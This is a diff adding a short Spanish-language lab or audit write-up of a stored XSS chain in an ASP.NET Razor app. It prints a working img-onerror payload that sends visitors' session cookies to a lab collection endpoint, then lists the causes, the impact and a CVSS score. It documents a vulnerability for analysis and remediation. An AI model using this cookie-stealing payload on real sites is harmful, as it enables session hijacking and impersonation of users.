@@ -1,0 +1,24 @@
+=== XSS Almacenado — Cadena Completa ===
+
+1. Payload inyectado (Comment #3, producto 1):
+   <img src=x onerror="fetch('/lab/collect?c='+encodeURIComponent(document.cookie))">
+
+2. Servidor renderiza sin escapar (@Html.Raw):
+   HTML en página: <img src=x onerror="fetch('/lab/collect?c='+encodeURIComponent(document.cookie))">
+   → Código JavaScript se ejecuta en el navegador de cualquier visitante
+
+3. Cookie theft:
+   GET /lab/collect?c=LabSession%3D[REDACTED] → HTTP 204
+   → Cookie enviada al endpoint controlado por atacante
+
+4. Condiciones que lo hacen posible:
+   - @Html.Raw(comment.Body) en la vista Razor (no usa @comment.Body)
+   - Cookie LabSession SIN flag HttpOnly
+   - Sin Content-Security-Policy header
+   - Sin validación/sanitización de input en comentarios
+
+5. Impacto:
+   - Robo de sesión de cualquier usuario que visite la página del producto
+   - Session replay para suplantar identidad
+   - Posible escalación si un admin visita la página
+   → CVSS 6.8 Medium (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N)
